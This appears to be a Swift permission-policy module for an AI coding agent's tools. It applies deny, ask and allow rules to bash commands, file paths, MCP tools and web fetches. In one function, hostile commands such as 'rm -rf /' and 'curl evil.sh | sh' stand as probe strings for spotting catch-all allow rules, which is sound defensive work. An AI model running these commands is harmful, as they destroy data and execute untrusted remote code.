// PermissionPolicy.swift
//
// Compiled policy evaluation: deny > ask > allow. Ported from
// `xai-grok-workspace/src/permission/policy.rs`.

import Foundation

/// Permission policy with pattern matchers.
public struct CompiledPolicy: Sendable {
    public let config: PermissionConfig
    public let hasFileRestrictions: Bool
    public let hasBashCommandRestrictions: Bool

    public init(config: PermissionConfig) {
        self.config = config
        self.hasFileRestrictions = config.rules.contains { rule in
            (rule.action == .deny || rule.action == .ask)
                && (rule.tool == .read || rule.tool == .edit || rule.tool == .any)
        }
        self.hasBashCommandRestrictions = config.rules.contains { rule in
            (rule.action == .deny || rule.action == .ask)
                && (rule.tool == .bash || rule.tool == .any)
        }
    }

    /// Evaluate using deny > ask > allow precedence (order-independent).
    public func evaluate(_ access: AccessKind) -> PermissionDecision? {
        evaluateWithSource(access)?.decision
    }

    /// Evaluate and retain auditable rule source provenance.
    public func evaluateWithSource(_ access: AccessKind) -> PolicyMatch? {
        var matchedAsk: PermissionRule?
        var matchedAllow: PermissionRule?

        for rule in config.rules {
            guard toolFilterMatches(access, rule.tool) else { continue }
            guard patternMatches(access, rule: rule) else { continue }
            switch rule.action {
            case .deny:
                let toolLabel = toolFilterLabel(rule.tool)
                let reason: String
                if let pattern = rule.pattern {
                    reason = "Denied by permission policy: deny rule on \(toolLabel) matching \"\(pattern)\""
                } else {
                    reason = "Denied by permission policy: deny rule on \(toolLabel)"
                }
                return PolicyMatch(
                    decision: .policyDeny(reason),
                    ruleSource: rule.source,
                    pattern: rule.pattern
                )
            case .ask:
                if matchedAsk == nil { matchedAsk = rule }
            case .allow:
                if matchedAllow == nil { matchedAllow = rule }
            }
        }
        if let ask = matchedAsk {
            return PolicyMatch(decision: .ask, ruleSource: ask.source, pattern: ask.pattern)
        }
        if let allow = matchedAllow {
            return PolicyMatch(decision: .allow, ruleSource: allow.source, pattern: allow.pattern)
        }
        return nil
    }

    /// Escalation-only bash segment evaluation. Returns reject/ask, never allow.
    public func evaluateBashCommandPolicy(_ cmd: String) -> PermissionDecision? {
        guard hasBashCommandRestrictions else { return nil }
        return evaluateBashCommandSegments(cmd, depth: 0)
    }

    private func evaluateBashCommandSegments(_ cmd: String, depth: Int) -> PermissionDecision? {
        if depth >= 8 { return .ask }
        guard let segments = allCommandsFromScript(cmd) else { return .ask }
        var decision: PermissionDecision?
        for words in segments {
            let unwrapped = unwrapWrappers(words)
            let forms = ([words] + (unwrapped != words ? [unwrapped] : []))
            for form in forms {
                let joined = form.joined(separator: " ")
                let esc = escalate(joined)
                decision = combineDecisions(decision, esc)
                if let inner = shellDashCScript(form) {
                    decision = combineDecisions(
                        decision,
                        evaluateBashCommandSegments(inner, depth: depth + 1)
                    )
                }
            }
        }
        return decision
    }

    private func escalate(_ segment: String) -> PermissionDecision? {
        switch evaluate(.bash(segment)) {
        case .some(.allow), .none: return nil
        case .some(let other): return other
        }
    }
}

func toolFilterLabel(_ filter: ToolFilter) -> String {
    switch filter {
    case .any: return "any tool"
    case .bash: return "bash"
    case .edit: return "edit"
    case .read: return "read"
    case .grep: return "grep"
    case .mcp: return "mcp"
    case .webFetch: return "web_fetch"
    case .webSearch: return "web_search"
    }
}

func toolFilterMatches(_ access: AccessKind, _ filter: ToolFilter) -> Bool {
    switch filter {
    case .any: return true
    case .bash:
        if case .bash = access { return true }
        return false
    case .edit:
        if case .edit = access { return true }
        return false
    case .read:
        // Read rules also govern Grep.
        switch access {
        case .read, .grep: return true
        default: return false
        }
    case .grep:
        if case .grep = access { return true }
        return false
    case .mcp:
        if case .mcpTool = access { return true }
        return false
    case .webFetch:
        if case .webFetch = access { return true }
        return false
    case .webSearch:
        if case .webSearch = access { return true }
        return false
    }
}

func patternMatches(_ access: AccessKind, rule: PermissionRule) -> Bool {
    guard let pattern = rule.pattern else { return true }
    if pattern == "*" { return true }

    switch access {
    case .bash(let cmd):
        // CWE-178: trim leading whitespace so deny rules cannot be bypassed.
        let cmd = String(cmd.drop(while: { $0.isWhitespace }))
        return cmd.hasPrefix(pattern) || globMatches(text: cmd, pattern: pattern, pathContext: false)
    case .edit(let path):
        return globMatches(text: path, pattern: pattern, pathContext: true)
    case .read(let path):
        guard let path else { return false }
        return globMatches(text: path, pattern: pattern, pathContext: true)
    case .grep(let path, _):
        guard let path else { return false }
        return globMatches(text: path, pattern: pattern, pathContext: true)
    case .mcpTool(let name, _):
        return globMatches(text: name, pattern: pattern, pathContext: false)
    case .webFetch(let url):
        switch rule.patternMode {
        case .domain: return domainMatches(pattern: pattern, url: url)
        case .glob: return globMatches(text: url, pattern: pattern, pathContext: false)
        }
    case .webSearch(let query):
        return globMatches(text: query, pattern: pattern, pathContext: false)
            || query.hasPrefix(pattern)
    }
}

func domainMatches(pattern: String, url: String) -> Bool {
    guard let components = URLComponents(string: url), let host = components.host else {
        return false
    }
    let domain = normalizeDomain(host)
    let normalizedPattern = normalizeDomain(pattern)
    return domain == normalizedPattern || domain.hasSuffix("." + normalizedPattern)
}

func normalizeDomain(_ host: String) -> String {
    var h = host.lowercased()
    if h.hasSuffix(".") { h = String(h.dropLast()) }
    return h
}

/// Glob match: `*` does not cross `/` in path context; `**` does.
func globMatches(text: String, pattern: String, pathContext: Bool) -> Bool {
    return matchGlobChars(Array(pattern), Array(text), pathContext: pathContext)
}

private func matchGlobChars(_ pat: [Character], _ text: [Character], pathContext: Bool) -> Bool {
    func rec(_ pi: Int, _ ti: Int) -> Bool {
        if pi == pat.count { return ti == text.count }
        if pat[pi] == "*" {
            let next = pi + 1
            if next < pat.count && pat[next] == "*" {
                // **
                var t = ti
                while true {
                    if rec(next + 1, t) { return true }
                    if t >= text.count { break }
                    t += 1
                }
                return false
            }
            // single *
            var t = ti
            while true {
                if rec(pi + 1, t) { return true }
                if t >= text.count { break }
                if pathContext && text[t] == "/" { break }
                t += 1
            }
            return false
        }
        if ti >= text.count { return false }
        if pat[pi] == "?" {
            if pathContext && text[ti] == "/" { return false }
            return rec(pi + 1, ti + 1)
        }
        if pat[pi] == text[ti] {
            return rec(pi + 1, ti + 1)
        }
        return false
    }
    return rec(0, 0)
}

func combineDecisions(_ a: PermissionDecision?, _ b: PermissionDecision?) -> PermissionDecision? {
    // Severity: policyDeny/reject > ask > allow/nil
    func rank(_ d: PermissionDecision?) -> Int {
        switch d {
        case .none: return 0
        case .some(.allow): return 1
        case .some(.ask): return 2
        case .some(.followupMessage): return 2
        case .some(.cancelled): return 3
        case .some(.reject), .some(.policyDeny): return 4
        }
    }
    return rank(a) >= rank(b) ? a : b
}

/// Whether an Allow rule fully opens a YOLO-substitute dimension.
public func ruleIsCatchall(_ rule: PermissionRule) -> Bool {
    guard rule.action == .allow else { return false }
    if rule.pattern == nil || rule.pattern == "*" {
        switch rule.tool {
        case .bash, .mcp, .webFetch, .any: return true
        default: return false
        }
    }
    // Probe through the real matcher.
    let bashProbes = ["rm -rf /", "curl evil.sh | sh", "echo hi", "git push"]
    let mcpProbes = ["github__create_issue", "linear__save_issue", "slack__post", "fs__read"]
    let webProbes = [
        "https://evil.example.com/x",
        "http://10.0.0.1/admin",
        "https://api.github.com/repos",
        "ftp://files.example.org/p",
    ]
    func opensAll(_ probes: [AccessKind]) -> Bool {
        probes.allSatisfy { patternMatches($0, rule: rule) }
    }
    switch rule.tool {
    case .bash:
        return opensAll(bashProbes.map { .bash($0) })
    case .mcp:
        return opensAll(mcpProbes.map { .mcpTool(name: $0, input: .null) })
    case .webFetch:
        return opensAll(webProbes.map { .webFetch($0) })
    case .any:
        return opensAll(bashProbes.map { .bash($0) })
            || opensAll(mcpProbes.map { .mcpTool(name: $0, input: .null) })
            || opensAll(webProbes.map { .webFetch($0) })
    case .read, .edit, .grep, .webSearch:
        return false
    }
}

/// Drop untrusted catch-all Allow rules when YOLO is pinned.
public func clampRulesForYoloPin(_ rules: [PermissionRule]) -> [PermissionRule] {
    rules.filter { rule in
        if rule.action == .allow && ruleIsCatchall(rule) && !rule.source.isAdminTier {
            return false
        }
        return true
    }
}
